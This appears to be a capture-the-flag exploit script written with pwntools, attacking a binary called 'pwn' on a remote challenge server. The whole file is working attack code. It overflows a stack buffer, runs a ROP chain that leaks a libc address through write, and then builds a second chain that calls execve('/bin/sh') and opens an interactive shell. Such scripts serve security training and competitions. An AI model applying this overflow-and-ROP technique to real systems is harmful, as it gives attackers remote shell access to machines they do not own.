from pwn import *

debug = False

if debug == True:
    p = process('./pwn')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    pop_rax = 0x43a78
    syscall = 0x13c0
else:
    p = remote('zsctf.zhakul.top', 30002)
    libc = ELF('libc-2.23.so')
    pop_rax = 0x33544
    syscall = 0x26bf

elf = ELF('./pwn')


payload = '\0'*136
payload+=p64(0x40056a)
payload+=p64(1)
payload+=p64(elf.got['__libc_start_main'])
payload+=p64(8)
payload+=p64(elf.sym['write'])
payload+=p64(0x400592)
p.sendline(payload)
libc.address = u64(p.recv(8))-libc.sym['__libc_start_main']
print 'LIBC: ', hex(libc.address)
print 'payload 1: ', payload


payload = '\0'*136
payload+=p64(0x40056a)
payload+=p64(libc.search('/bin/sh').next())
payload+=p64(0)
payload+=p64(0)
payload+=p64(libc.address+pop_rax)
payload+=p64(59)
payload+=p64(libc.address+syscall)
print 'payload 2: ', payload
p.sendline(payload)
p.interactive()
